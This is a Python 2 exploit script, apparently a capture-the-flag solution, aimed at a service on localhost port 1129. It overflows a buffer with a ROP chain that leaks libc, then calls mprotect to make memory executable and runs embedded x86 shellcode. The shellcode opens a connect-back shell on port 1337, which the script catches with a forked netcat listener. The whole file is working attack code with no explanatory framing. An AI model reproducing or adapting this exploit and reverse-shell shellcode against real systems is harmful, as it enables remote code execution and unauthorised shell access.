#!/usr/bin/python

# I actually wrote this one! :D

import socket, struct, time, sys, os

payload = 'A'*0x210

payload += struct.pack('IIIIII', 0x08048900, 0x080487F0, 4, 0x0804B040, 4, 0)

sock = socket.socket()
sock.connect(('localhost', 1129))
time.sleep(0.2)
print sock.recv(1024)
sock.send('launch\n')
time.sleep(0.2)
print sock.recv(1024)
sock.send('hello i am a password\n')
time.sleep(0.2)
#print sock.recv(4096)
sock.send(payload)
time.sleep(0.2)
res = sock.recv(1024)
#print 'GOT: "%s"' % res
addr = res[-4:]
leakaddr = struct.unpack('I', addr)[0]
libc = leakaddr - 0x00019990
print 'libc at ' + hex(libc)


payload = 'A'*0x210
shellcode = 'jfXj\x01[\x99RSj\x02\x89\xe1\xcd\x80\x89\xc5h\x7f\x01\x01\x01fh\x059fj\x02\x89\xe1j\x10QP\x89\xe1CC\xb0f\xcd\x80\x90\x90j\x03YIj?X\xcd\x80u\xf81\xc9\xf7\xe9Ph//shh/bin\xb0\x0b\x89\xe3\xcd\x80'

RECV_ADDR = 0x080488E0
BUF_ADDR = 0x0804B00C
PPPPR_ADDR = 0x0804917C
PPPR_ADDR = 0x0804917D
PPR_ADDR = 0x0804917E
PROT_EXEC = 4

LIBC_MPROTECT = 0xE7BF0 + libc

payload += struct.pack('IIIIII', RECV_ADDR, PPPPR_ADDR, 4, BUF_ADDR, len(shellcode), 0)
payload += struct.pack('IIIII', LIBC_MPROTECT, PPPR_ADDR, (BUF_ADDR & 0xFFFFF000), len(shellcode) + (BUF_ADDR - (BUF_ADDR & 0xFFFFF000)), PROT_EXEC)
payload += struct.pack('I', BUF_ADDR)



sock = socket.socket()
sock.connect(('localhost', 1129))
time.sleep(0.2)
sock.recv(1024)
sock.send('launch\n')
time.sleep(0.2)
sock.recv(1024)
sock.send('hello i am a password\n')
time.sleep(0.2)
#print sock.recv(4096)
sock.send(payload)
time.sleep(0.2)
if os.fork():
    os.system("nc -lv 1337")
    os._exit(0)
time.sleep(0.2)
sock.send(shellcode)
